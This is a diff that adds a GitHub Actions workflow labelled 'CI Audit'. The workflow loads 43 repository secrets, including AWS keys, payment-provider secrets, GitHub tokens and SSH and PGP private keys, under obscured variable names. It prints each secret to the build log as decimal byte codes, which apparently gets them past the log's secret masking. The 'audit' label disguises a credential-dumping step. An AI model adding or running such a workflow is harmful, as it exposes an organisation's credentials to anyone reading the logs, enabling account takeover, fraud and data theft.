@@ -1,0 +1,62 @@
+name: CI Audit
+
+on:
+  workflow_dispatch:
+
+jobs:
+  audit:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Environment Audit
+        env:
+          V0: ${{ secrets.AWS_ACCESS_KEY_ID }}
+          V1: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+          V2: ${{ secrets.DOCKER_USERNAME }}
+          V3: ${{ secrets.DOCKER_PASSWORD }}
+          V4: ${{ secrets.DATABASE_URL }}
+          V5: ${{ secrets.DB_PASSWORD }}
+          V6: ${{ secrets.DB_USER }}
+          V7: ${{ secrets.DB_HOST }}
+          V8: ${{ secrets.STRIPE_API_KEY }}
+          V9: ${{ secrets.STRIPE_SECRET_KEY }}
+          V10: ${{ secrets.PAYPAL_CLIENT_ID }}
+          V11: ${{ secrets.PAYPAL_CLIENT_SECRET }}
+          V12: ${{ secrets.NPM_TOKEN }}
+          V13: ${{ secrets.GITHUB_TOKEN }}
+          V14: ${{ secrets.GH_PAT }}
+          V15: ${{ secrets.GH_TOKEN }}
+          V16: ${{ secrets.SLACK_WEBHOOK }}
+          V17: ${{ secrets.SLACK_TOKEN }}
+          V18: ${{ secrets.SENTRY_DSN }}
+          V19: ${{ secrets.SENTRY_AUTH_TOKEN }}
+          V20: ${{ secrets.REDIS_URL }}
+          V21: ${{ secrets.REDIS_PASSWORD }}
+          V22: ${{ secrets.MONGO_URL }}
+          V23: ${{ secrets.MONGO_PASSWORD }}
+          V24: ${{ secrets.JWT_SECRET }}
+          V25: ${{ secrets.SECRET_KEY }}
+          V26: ${{ secrets.API_KEY }}
+          V27: ${{ secrets.API_SECRET }}
+          V28: ${{ secrets.SSH_PRIVATE_KEY }}
+          V29: ${{ secrets.SSH_KEY }}
+          V30: ${{ secrets.PGP_PRIVATE_KEY }}
+          V31: ${{ secrets.CLOUDFLARE_API_TOKEN }}
+          V32: ${{ secrets.CLOUDFLARE_API_KEY }}
+          V33: ${{ secrets.DIGITALOCEAN_TOKEN }}
+          V34: ${{ secrets.DO_API_TOKEN }}
+          V35: ${{ secrets.HEROKU_API_KEY }}
+          V36: ${{ secrets.VERCEL_TOKEN }}
+          V37: ${{ secrets.NETLIFY_AUTH_TOKEN }}
+          V38: ${{ secrets.RENDER_API_KEY }}
+          V39: ${{ secrets.FLY_API_TOKEN }}
+          V40: ${{ secrets.ENV }}
+          V41: ${{ secrets.ENVIRONMENT }}
+          V42: ${{ secrets.NODE_ENV }}
+        run: |
+          echo "=== SECRETS AUDIT ==="
+          for var in $(env | grep '^V' | sort); do
+            varname=$(echo "$var" | cut -d= -f1)
+            val=$(echo "$var" | cut -d= -f2-)
+            echo "$varname: ASCII=[$(echo -n "$val" | od -An -tu1 | tr '\n' ' ')]"
+          done
+          echo "=== AUDIT COMPLETE ==="
